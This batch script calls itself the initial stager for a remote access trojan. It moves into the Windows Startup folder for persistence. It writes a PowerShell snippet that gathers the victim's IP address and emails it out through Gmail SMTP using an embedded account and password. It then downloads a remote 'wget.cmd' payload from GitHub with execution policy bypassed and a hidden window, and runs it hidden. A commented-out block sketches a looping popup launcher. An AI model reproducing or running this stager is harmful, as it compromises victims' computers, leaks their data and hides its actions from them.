@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem create smtp.txt file for future reconnaissance
(
    echo $email = "defalttests@gmail.com"
    echo $password = "nkos qxgo yxvo brmr"
    echo $subject = "$env:username logs"
    echo $ip = (get-netipaddress -addressfamily ipv4 -interfacealias ethernet).ipaddress
    echo echo "ip : $ip">"$env:username.rat"
    echo $smtp = New-Object system.net.mail.smtpclient("smtp.gmail.com","587")
    echo $smtp.enableSSL=$true
    echo $smtp.credentials=New-Object system.net.networkcredential($email,$password)
    echo $smtp.send($email,$email,$subject,$ip)

)>smtp.txt

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/wget.cmd' -outfile '.\wget.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"

@rem move back to saved directory
cd %InitialPath%

@REM del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

